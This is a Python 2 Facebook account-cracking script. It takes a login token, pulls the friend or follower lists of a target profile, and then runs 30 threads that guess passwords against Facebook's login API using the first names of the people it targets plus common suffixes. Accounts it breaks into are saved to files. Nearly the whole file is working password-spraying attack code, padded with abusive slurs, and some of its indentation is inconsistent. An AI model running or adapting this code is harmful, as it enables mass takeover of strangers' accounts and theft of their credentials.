#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by Someone Else
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

agents =[
  "Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """
\033[1;92m_________________________________________________
      
\033[1;92m _______  ______   ______           
\033[1;92m(  ___  )(  ___ \ (  __  \ |\     /|
\033[1;92m| (   ) || (   ) )| (  \  )| )   ( |
\033[1;92m| (___) || (__/ / | |   ) || |   | |
\033[1;92m|  ___  ||  __ (  | |   | || |   | |
\033[1;92m| (   ) || (  \ \ | |   ) || |   | |
\033[1;92m| )   ( || )___) )| (__/  )| (___) |
\033[1;92m|/     \||/ \___/ (______/ (_______)

\033[1;92m _        _        _______          
\033[1;92m( \      ( \      (  ___  )|\     /|
\033[1;92m| (      | (      | (   ) || )   ( |
\033[1;92m| |      | |      | (___) || (___) |
\033[1;92m| |      | |      |  ___  ||  ___  |
\033[1;92m| |      | |      | (   ) || (   ) |
\033[1;92m| (____/\| (____/\| )   ( || )   ( |
\033[1;92m(_______/(_______/|/     \||/     \|
                                     
\033[1;92m──────────────────────────────────•••••••••••
     \033[1;92m>> Author= DAD☆OF☆BAD
     \033[1;92m>> FACEBOOK= TEAM DADOFBAD
     \033[1;92m>> WHATTSAPP=BHAG BHOSRIKE
\033[1;92m------------------------------------------------"""


def main():
	os.system("clear")
	print(logo)
	print("")
	print(" \x1b[1;92m    \tMain menu")
	print("")
	print(" \x1b[1;92m     [1] START CLONING\n")
	print("")
	os.system('xdg-open https://www.facebook.com/Imtiaz.offcial')
	log_sel()
def log_sel():
	select = raw_input("\033[1;92mChoose option: \033[0;93m")
	if select =="1":
		login()
   
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def login():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("")
		print(" \x1b[1;92m  \tFacebook login")
		print("")
		print(47*"-")
		print(" \x1b[1;92m   [1] FACEBOOK ID/PASS LOGIN\n")
		print(" \x1b[1;92m   [2] FACEBOOK TOKEN LOGIN\n")
		print("  \x1b[1;92m  [3] Follow Me On Facebook ")
        print("  \x1b[1;92m  [4] Back ")
		print(47*"-")
		print("")
		log_select()
def log_select():
	sel = raw_input(" Choose an option: ")
	if sel =="1":
		log_fb()
	elif sel =="2":
		token()
	elif sel =="3":
		follow()
    elif sel =="4":
		ran()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def log_fb():
	os.system("clear")
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
		print("")
		print("\tFacebook id/pass login")
		print("")
		uid = raw_input(" Uid: ")
		passw = raw_input(" Password: ")
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav = open("access_token.txt", "w")
			sav.write(q["access_token"])
			sav.close()
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			print("\tAccount has checkpoint")
			print("")
			time.sleep(1)
			login()
		else:
			print("")
			print("\tId/pass my be wrong")
			print("")
			time.sleep(1)
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("")
        print(" \x1b[1;92m  \tLogin token")
        print("")
        token = raw_input        (" Token Dal Bharwe: ")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def follow():
	os.system("clear")
    print("Search On Fb Imtiaz.offcial")
         log_select()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("")
    print("   TU GANDU: "+name)
    print("")
    print("    Free mode :Actvited")
    print("")
    print(47*"-")
    print("")
    print(" \x1b[1;92m[1] CRACK AUTO PASS\n")
    print(" \x1b[1;92m[2] CRACK CHOICE PASS\n")
    print(' \x1b[1;92m[3] BACK')
    print(47*"-")
    print("")
    menu_option()
def menu_option():
	select = raw_input("\033[1;92mChoose option: \033[0;93m")
	if select =="1":
		crack()
	elif select =="2":
		choice()
		
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tSahi Token Dal Gandu ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")
	print("")
	print(47*"-")
	print("\x1b[1;92m       [1] CRACK PUBLIC ID")
	print("\x1b[1;92m       [2] CRACK FOLLOWERS")
	print(" \x1b[1;92m      [0] BACK")
	print(47*"-")
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33mChoose option: \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
		print("")
		idt = raw_input("  Baji Ka Link Dal: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("\tAuto pass cracking")
			print('')
			print("  Abe Gandu : "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tAuto pass cracking")
		print("")
		idt = raw_input("  Baji Ka Link dal: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tAuto pass cracking')
			print('')
			print("  Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			raw_input(" Press My Dick to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	print("  Total IDs : "+str(len(id)))
	print("  The Process has started")
	print("  Tajedare hatme nabuwat zindabad ")
	print(" \x1b[1;92m Press ctrl + z to stop")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()+"123"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [Taliban-ok] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("Talibanok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("Talibancp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+"1234"
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("Talibanok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("Talibancp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"12345"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("Talibanok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("Talibancp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"786"
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("Talibanok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("Talibancp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+'1122'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("Talibanok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("Talibancp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "Pakistan"
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("Talibanok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("Talibancp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "786786"
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("Talibanok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("Talibancp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	print(47*"-")
	print("   \x1b[1;92mCHAL NIKAL BHOSRIKE")
	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("")
	print("")
	raw_input(" \x1b[1;92m Press My Dick to back ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")
	print("")
	print(47*"-")
	print("\x1b[1;92m       [1] CRACK PUBLIC ID")
	print("\x1b[1;92m       [2] CRACK FOLLOWERS")
	print(" \x1b[1;92m      [0] BACK")
	print(47*"-")
	print("")
	choice_select()
def choice_select():
	select = raw_input("\033[1;32mChoose option: \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		pass4 = raw_input(" Password: ")
		pass5 = raw_input(" Password: ")
		pass6 = raw_input(" Password: ")
		pass7 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mAUTO PASS CRACK FOLLOWERS\033[0;97m")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		pass4 = raw_input(" Password: ")
		pass5 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\Choice pass cracking')
			print('')
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option\033[0;97m")
		print("")
		choice_select()
	print(" \x1b[1;92m Total IDs : "+str(len(id)))
	print(" \x1b[1;92m The Process has started")
	print(" \x1b[1;92m Press ctrl + z to stop")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("Talibanok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("Talibancp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("Talibanok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("Talibancp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("Talibanok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("Talibancp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("Talibanok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("Talibancp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("Talibanok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("Talibancp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("Talibanok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	print(47*"-")
	print(" \x1b[1;92m  Chal Nikal Bhosrike")
	print(" \x1b[1;92m   Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("")
	print("")
	raw_input(" \x1b[1;92m Press My Dick to back ")
	main()
	
	
if __name__ == '__main__':
	main()

